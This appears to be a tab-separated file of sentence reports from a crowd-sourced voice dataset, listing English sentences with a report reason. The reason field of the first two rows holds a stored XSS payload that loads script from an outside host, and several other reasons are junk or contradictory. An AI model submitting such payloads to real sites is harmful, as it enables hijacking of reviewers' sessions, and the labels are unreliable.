sentence_id	sentence	locale	reason
b3b0bf9f7d59f2967ccabe0fbc13b7b184318d2530e23ff1f36c7f901eb0195f	He also reveals that Koval was working for Starfleet.	en	"><script src=https://vasgrg.xss.ht></script>
b3b2c583e18a6f37be24b9d5894ab4e5ad66a4624219776ee9e42ee81759f335	Most have image stabilization and built-in flash.	en	"><script src=https://vasgrg.xss.ht></script>
b3ff82e08d11a6c643afeed2e142ae551f3edbd14d12adaa14a249ec1ccbab03	Apart from Bengali, Telugu, Hindi are widely spoken languages.	en	grammar-or-spelling
b3f5c2440f6492e61d91ab534ca8ad8e0ebe0d6659d255322ed1fe00999644e3	It is located just south of Ouray, ColoradoOuray, in Ouray County, Colorado.	en	grammar-or-spelling
b3e2b0ac18a4d851abb586e7803c75dbfbaf3ec4db3b4514ba9d18a30ba4815d	It is One of the most frequently visited place by the tourists.	en	grammar-or-spelling
b43c5a81b51bbdb4e232b9d1c7b3c9242f037c9dac6d233ea6910122c096e3a2	The name is derived from a native Korean designation meaning small ridge.	en	offensive-language
b43c5a81b51bbdb4e232b9d1c7b3c9242f037c9dac6d233ea6910122c096e3a2	The name is derived from a native Korean designation meaning small ridge.	en	grammar-or-spelling
b43c5a81b51bbdb4e232b9d1c7b3c9242f037c9dac6d233ea6910122c096e3a2	The name is derived from a native Korean designation meaning small ridge.	en	different-language
b43c5a81b51bbdb4e232b9d1c7b3c9242f037c9dac6d233ea6910122c096e3a2	The name is derived from a native Korean designation meaning small ridge.	en	difficult-pronunciation
b43c5a81b51bbdb4e232b9d1c7b3c9242f037c9dac6d233ea6910122c096e3a2	The name is derived from a native Korean designation meaning small ridge.	en	?????
b458908229195818d6cd3ba4b6f137fa1a4ea4c9e2b550dd403e596bf4f639ed	The talks later continued under the new administration of President George W. Bush.	en	difficult-pronounce
b47866216553002b83422634e55606a3a6485156f8ec3e4ff8d72513c16768c4	Woodley split time with backup Don Strock, or "WoodStrock" as they were referred.	en	grammar-or-spelling
b42256f0a7a9c4b5fae15a8c441665a9e992b4d4176b213ae63b2f6d9958817a	Currently, he sits on the Institute Turgot in Belgium.	en	grammar-or-spelling
b49ee97b746e8eab327060fa6960a732add126aa2d0af3d997880328db64abcf	The U-Bahn jargon shorthand for it is "Bw Britz".	en	grammar-or-spelling
b4a9094806ee10c0a34e8c5c9b08ad9117fad01dd4ba0b2930efa99f6570ed29	When the Thameslink Programme is complete, Thameslink trains to will use this platform.	en	grammar-or-spelling
b4a465434e7e913964973f5c34b6b867eab4244eb5a98dcf1e048bd480f64a74	Hira was as the time a vassal of the Persian Sasanian Empire.	en	grammar-or-spelling
b4bb7fb4d7835a4165674082125268b732b700d1641a3015952693739d940c9d	There is an amusement park near the town of Hellendoorn called "Avonturenpark Hellendoorn".	en	difficult-pronounce
b4d2d1b8efdef9f204a24481c7c23be512ee9ac7e36d55ab9492a82bf8ced421	Kennebec is located in section of agricultural use area in Kennebec Township.	en	grammar-or-spelling
b4d2d1b8efdef9f204a24481c7c23be512ee9ac7e36d55ab9492a82bf8ced421	Kennebec is located in section of agricultural use area in Kennebec Township.	en	grammar-or-spelling
b4d2d1b8efdef9f204a24481c7c23be512ee9ac7e36d55ab9492a82bf8ced421	Kennebec is located in section of agricultural use area in Kennebec Township.	en	different-language
b50bf85fa6e0c571faa5844dcac700dc83e8f0fef6a3cbcbb7a2259c60afc57a	He has previously played for the Toronto Blue Jays, LosAngeles Dodgers, and Philadelphia Phillies.	en	grammar-or-spelling
b510f6805fb606ef75cff431b118ef206942bce5c07abb4196ba70d0b69ef434	He had close relationship with the pro-democrats.	en	grammar-or-spelling
b512092606d383711385fce3c0969afdfbc9cd354c1944c9bebd60f0ab35844f	Early signs of this serious complication may be coughing on drinking or eating.	en	grammar-or-spelling
b5136f2ddf6e72832966c91dde3bdb061d36930d49969d22c4e34e54e3d741be	Output was and of torque.	en	grammar-or-spelling
b524e7e494d5ce7ac6887ac63756d7f179b1f21728450a0463b5c2a122c5f48a	He notes in both More Than One Way?	en	grammar-or-spelling
b51198a4f53a64d7c4e888a1eb31a1393ffdb61acf5564373e47d73f0f31e96d	Grillo-Marxuach also wrote a weekly pop-culture column for the campus newspaper, The Tartan.	en	difficult-pronunciation
b4e23645a43b66e9441f37fb3f33051538c89dcf5e0272d3c7f4b2dff0153592	Its capital city was Siedlce.	en	difficult-pronunciation
b514ed988ea378580ad48246b88368dab819ae83d04e84d03e6d5239538592aa	The village was formerly spelt Tagumlag, Tymulagy, Tymoleague.	en	difficult-pronunciation
b5209325c2b4f674db1f0a266fef164b1c2475513ec7441bba01a545052ed74c	Is also present in modern Christian culture, in which the term is fixed.	en	grammar-or-spelling
b5247eb060e471e3aef67536bbd95cfba69b9c7fcf711c1572612d7375a464ab	The city was named from the dense forest near the original the town site.	en	grammar-or-spelling
b52fcd9cdcd5dacaeb22b12ee65ec57671dab6d31f741bf0cee1132ecc21b9da	The only other town within the commune is Canach.	en	offensive-language
b5247eb060e471e3aef67536bbd95cfba69b9c7fcf711c1572612d7375a464ab	The city was named from the dense forest near the original the town site.	en	grammar-or-spelling
b51a8ee1337444ad0d97b48dfb69d69dd4370cab34da2c5a17442b4ae44844b2	Hypericin derives from polyketides cyclisation.	en	difficult-pronounce
b53232dc629a13bb6865e40cc2f003f17473b227554c718bf24039316b05d3ad	The cantilever span is providing a maximum clearance of over the water.	en	grammar-or-spelling
b547e03d9e1d78ae474861a5b308876720a55a8358b2e8f37b4e141942c96267	Many homosexual men where deported to Nazi concentrations camps and where killed.	en	grammar-or-spelling
b52f93e151b03a9d54f0338efa1bf716d20567819e487ca1734595227539aa9d	Some birds may have greyish heads, causing confusion with mangrove kingfisher.	en	grammar-or-spelling
b54b0f8cc45e2309a5250f8ceafecc74df8bec3915c681cb242e4557d8aa424c	A few years later, Hubenthal began drawing a weekly sports cartoons.	en	grammar-or-spelling
b54fe25a1389902a0ab862564036842ca5dffd91004fc6eee29aa9b17516098b	Tommy, himself a rock guitarist, is the son of musician Dag Ingebrigtsen.	en	difficult-pronounce
b53d1ee9984acd92dfd485a0d75b9dc363ec9de774c4986076664108ed22c3c4	The resulting TestDaF exams are run by the TestDaF-Institut in Hagen.	en	difficult-pronounce
b541525b171c8575ae953a72bdfb780e827fc3ab4c90e45bdcfb68092bdb5518	A single of the same-title song was released the same of the album.	en	grammar-or-spelling
31264aa260091fa8649f68c07b896135cc3555753a09ace2dbcae0d1d3443d7a	Goa is a smallest state of India.	en	grammar-or-spelling
b4db4cbf7c1b55b75c6d2604c2f920c7962d120c05462420885f65a775067a99	The soldiers from took Canalizo prisoner.	en	grammar-or-spelling
b5699c1a46e7f8c94a09e39e9607d8c9dedf487c38ac388720af1e28ffbf0ab8	The name was later modified to Antelope Valley College to reflect it comprehensive nature.	en	grammar-or-spelling
b57373801c229129b5a8db4a5479dba9b9df0baa80a01647e612eeff706ce20c	Results does not deal with defections and by-elections during the mandate period.	en	grammar-or-spelling
b5699c1a46e7f8c94a09e39e9607d8c9dedf487c38ac388720af1e28ffbf0ab8	The name was later modified to Antelope Valley College to reflect it comprehensive nature.	en	grammar-or-spelling
b57586a05b3e6e78a3b0d1ffe9bf0b69dd152cad3202b48f5d6ac3839c14fbb9	Those same voters then vote any of the three finalists in each category.	en	grammar-or-spelling
b59108f483d10a41b3d911e8cf7477c16ceed28fe0ea7f2ecc769725e89ae4a3	He played college football at Vanderbilt.	en	offensive-language
b59108f483d10a41b3d911e8cf7477c16ceed28fe0ea7f2ecc769725e89ae4a3	He played college football at Vanderbilt.	en	grammar-or-spelling
b59108f483d10a41b3d911e8cf7477c16ceed28fe0ea7f2ecc769725e89ae4a3	He played college football at Vanderbilt.	en	different-language
b59108f483d10a41b3d911e8cf7477c16ceed28fe0ea7f2ecc769725e89ae4a3	He played college football at Vanderbilt.	en	difficult-pronounce
b59108f483d10a41b3d911e8cf7477c16ceed28fe0ea7f2ecc769725e89ae4a3	He played college football at Vanderbilt.	en	Common Voice

b5c994f1cff123136525e211e20582931feced1385d10b6745a322a2b9ec56b2	The tarmac section between Bollington and Macclesfield is suitable for all cycles.	en	difficult-pronunciation
b5d004b9064908d015013f45bd2644e4ab66f97af3c44ae9bba32941a6056982	Mechanic Theatre in Baltimore.	en	offensive-language
b5e37c075ceef2a890b1b6d82e50d7a3d6bd82856f94fa95b47ef864f3b3104c	Copenhagen and got through to the group stage.	en	grammar-or-spelling
b5df19a794a3964a0f354073c784443828fd0ed476f62a1c1a356d91b2700a70	Assent to become K. Tesamen Hogerop Diest.	en	difficult-pronounce
b5df19a794a3964a0f354073c784443828fd0ed476f62a1c1a356d91b2700a70	Assent to become K. Tesamen Hogerop Diest.	en	grammar-or-spelling
b62963155eaf7cc3d27c5368988b96aace4358e1c0858398c9d5d4e792ee6971	These roadworks have made any future extension of rail to impossible.	en	grammar-or-spelling
b638e14747662f6dadc1be008c6bd07e6dd31d41eec6a2f7818acac1d89361fd	Al-Tabari refers to the same raid.	en	grammar-or-spelling
b638e14747662f6dadc1be008c6bd07e6dd31d41eec6a2f7818acac1d89361fd	Al-Tabari refers to the same raid.	en	difficult-pronunciation
b695a7595bf0e095aab8da3fe48986759ed04de0577d37dae227562e6efdca3c	If sheep are not found dead, signs include abdominal pain and recumbency.	en	grammar-or-spelling
b695a7595bf0e095aab8da3fe48986759ed04de0577d37dae227562e6efdca3c	If sheep are not found dead, signs include abdominal pain and recumbency.	en	difficult-pronunciation
b6c564446c819587667bdc0cd3259291e7517a4cbf803832a098c48f48671c15	Shall we extract Mr. Pickwick’s masterly description of that heartrending scene?	en	grammar-or-spelling
b70315712d90f3852b9244abfb60522176dbba5c0256bf98df84b968e7fcf1f3	The garrison of men and was insufficient to man the forts and field fortifications.	en	grammar-or-spelling
b71b1d1db5e6ebc0b163bf62de3d75f386fc81deae047167f133180bfaefe499	Their relatively inexpensive offerings doubtless brought many people into the hobby.	en	grammar-or-spelling
b71be0e8340be1b082933c9118411522a0e323021e01e1c55b21bccec1ef2be1	The laws passed segregated African Americans from Whites.	en	grammar-or-spelling
b720ee0d32a03bf8972153ed564694853db46dbeed1e500e89519ec30d55726e	It also has an important industry of silk, wool and preserved food.	en	offensive-language
b720ee0d32a03bf8972153ed564694853db46dbeed1e500e89519ec30d55726e	It also has an important industry of silk, wool and preserved food.	en	grammar-or-spelling
b720ee0d32a03bf8972153ed564694853db46dbeed1e500e89519ec30d55726e	It also has an important industry of silk, wool and preserved food.	en	different-language
b720ee0d32a03bf8972153ed564694853db46dbeed1e500e89519ec30d55726e	It also has an important industry of silk, wool and preserved food.	en	difficult-pronunciation
b720ee0d32a03bf8972153ed564694853db46dbeed1e500e89519ec30d55726e	It also has an important industry of silk, wool and preserved food.	en	hx?????. ??g!d!dhh?. ??? ????????????
b7237953fb4ee11ec4b25f5f826fafe3e64fa1a21e7b4aa6a2b17bf3625608e2	He also said the program will have to be structured to pay for itself.	en	grammar-or-spelling
b71f2ba771c04f184dd73d01d6742d6c385d18bfcb15a974c4a986894d6287e6	Bhutia women enjoy a much higher status than their counterparts from other communities.	en	grammar-or-spelling
b7654b595d8f25c719be49200642e1b14cad010d69a500baf6752c4d6d5cbf40	Wherever You Are as director and producer, which screened at several film festivals.	en	grammar-or-spelling
b73ca5c5bd1fe1a091b6826c9fc8fc43054e80604b9d3ee582fea06c8165e850	Events feature traditional folk art forms such as Ottanthullal, Kathakali, Thayambaka, Chenda melam, Kacheri.	en	difficult-pronounce
b727a3f378fcae0c0450f07d33984c2b75ce463ca03881c2d375bf7755833968	Her performs on Yugoslav festivals were always finished with Tereza's triumph.	en	grammar-or-spelling
b7602deb1eaa69455c333279eb8a5dfc7bc1482652cfa6b0fc48ced5bc4f8bb0	The song is also referenced in the Temptations song "Message From a Black Man".	en	grammar-or-spelling
b74b7cb41aa705ce8f9a24784efa58a01bc482505d075e05fab78035575d48cb	This one of the first skirmishes of the First English Civil War.	en	grammar-or-spelling
b6ce5720b1b66580b8215a5d150041b09e979a880bc73ffb419e667a4d13ee3b	Scholars have labeled this method of narration an apophthegm, chreia or pronouncement story.	en	grammar-or-spelling
b7c6084f736c39c28bdd57063f3b6c27b21358a43f3438c26db48cff9a9e44eb	The most notable sports team for Carleton is the men's basketball team.	en	offensive-language
b7c6084f736c39c28bdd57063f3b6c27b21358a43f3438c26db48cff9a9e44eb	The most notable sports team for Carleton is the men's basketball team.	en	grammar-or-spelling
b7c6084f736c39c28bdd57063f3b6c27b21358a43f3438c26db48cff9a9e44eb	The most notable sports team for Carleton is the men's basketball team.	en	different-language
b7c6084f736c39c28bdd57063f3b6c27b21358a43f3438c26db48cff9a9e44eb	The most notable sports team for Carleton is the men's basketball team.	en	difficult-pronunciation
b7c6084f736c39c28bdd57063f3b6c27b21358a43f3438c26db48cff9a9e44eb	The most notable sports team for Carleton is the men's basketball team.	en	Angelika 
b77c65d92f1e0a331e905051f9b9993e4c936e28b264313f16e10f5b3b9374f8	Based on administrative classification, are municipal roads and are barangay roads.	en	grammar-or-spelling
b7c370891a1f241bd4a94d1b502d6710fac903334d6128a831a05ceddcbbf7d2	Other raids included the Thamshavnbanen sabotage.	en	difficult-pronounce
b7d5cf7692114386bcb45719f0f7ae7cb2977629640ccbb2ee945a8a668cfc94	In Biblical Hebrew, "resheph" means "flame, firebolt", derived from "to burn".	en	difficult-pronounce
b7dd9514aafb454e33037605c2b57c5b6e5d576cc76f98c0bcf3d7b3bd5f538d	Upon graduation he moved to New York.	en	offensive-language
b7dd9514aafb454e33037605c2b57c5b6e5d576cc76f98c0bcf3d7b3bd5f538d	Upon graduation he moved to New York.	en	grammar-or-spelling
b7dd9514aafb454e33037605c2b57c5b6e5d576cc76f98c0bcf3d7b3bd5f538d	Upon graduation he moved to New York.	en	different-language
b7dd9514aafb454e33037605c2b57c5b6e5d576cc76f98c0bcf3d7b3bd5f538d	Upon graduation he moved to New York.	en	difficult-pronunciation
b6ce5720b1b66580b8215a5d150041b09e979a880bc73ffb419e667a4d13ee3b	Scholars have labeled this method of narration an apophthegm, chreia or pronouncement story.	en	policja
b7b3bc2ba809090f516163f8c498f67de9f58faea7b2ac276260a17ac36bf71d	Since that time the attrition rate has decreased.	en	offensive-language
b7b3bc2ba809090f516163f8c498f67de9f58faea7b2ac276260a17ac36bf71d	Since that time the attrition rate has decreased.	en	grammar-or-spelling
b7b3bc2ba809090f516163f8c498f67de9f58faea7b2ac276260a17ac36bf71d	Since that time the attrition rate has decreased.	en	different-language
b7b3bc2ba809090f516163f8c498f67de9f58faea7b2ac276260a17ac36bf71d	Since that time the attrition rate has decreased.	en	difficult-pronounce
b7fb8237363c97e34cedfdc4249e3279d36b14c7205a4df796b345904613eb9b	Mr. Winkle modestly repeated his suggestion.	en	grammar-or-spelling
b7ca7b205cc5c1f3c17d34003dd12affe63eed50e388229523ad859a2190de66	The five main spans are each long.	en	grammar-or-spelling
b7dbd6f232e8280fda5d0aa178065ec3ac9568d1d5efed3d4499856f6a8d379a	Last but not least these surahs contains eschatological prophecies.	en	grammar-or-spelling
b7e748a904e48c3fbc04d2c88409f8a35b4b2683e6c05b8759e58917069a1edb	Louvois was one of the greatest of the rare class of great war ministers.	en	offensive-language
b811a6b816f347d85ee526a933d8a0d987c8258382b170894385c170db5c519f	A large statue of an eagle was placed near the entrance to the park.	en	difficult-pronunciation
b80f438bbc5e8222b4c02439e8c9b41849972b5a4564687409e6dc8652a77072	The Bang Mot tangerine is grown in the area.	en	offensive-language
b7f363948767967a3da9ae8acd6768f72da242ddd435a29a539ba2cf2b8d141d	He used these features to great effect.	en	elo
b80cea94e446f83fe6cdb29ef5d55fdfdb21ea451ca981ce6d114d380ef7b3d0	Rohmann is a graduate of Illinois State University and Arizona State University.	en	offensive-language
b80cea94e446f83fe6cdb29ef5d55fdfdb21ea451ca981ce6d114d380ef7b3d0	Rohmann is a graduate of Illinois State University and Arizona State University.	en	grammar-or-spelling
b80cea94e446f83fe6cdb29ef5d55fdfdb21ea451ca981ce6d114d380ef7b3d0	Rohmann is a graduate of Illinois State University and Arizona State University.	en	different-language
b7f6a0dc6587b68c09dd40ba92d3fa3a4c5d7fdfd5efade092e34edb0b38090c	Financier is a term used to describe someone who handles money.	en	different-language
b811d600135bfd0e56d72cacac4468027a59250c0a581566bd279578295279ab	To cope with "g"-forces during takeoff, the pilot would lie in a prone position.	en	offensive-language
b811d600135bfd0e56d72cacac4468027a59250c0a581566bd279578295279ab	To cope with "g"-forces during takeoff, the pilot would lie in a prone position.	en	grammar-or-spelling
b811d600135bfd0e56d72cacac4468027a59250c0a581566bd279578295279ab	To cope with "g"-forces during takeoff, the pilot would lie in a prone position.	en	different-language
b82f9217347a292c5207208e45240155a49f17bde077b653ecf497947210900e	Both Lana and Lois became Superwoman.	en	erwan
b869aed2395b31a64b4f73ca32283852a68d3dc3c707985335e96ec29d240673	An example of actively researched compounds in this field are certain coronenes.	en	difficult-pronounce
b805425eed4153e20cc7a064cc01fbd33034dbc28d9c5a3b2c0e297149002c8e	He would later use this title for DuPont Corporation campaign.	en	offensive-language
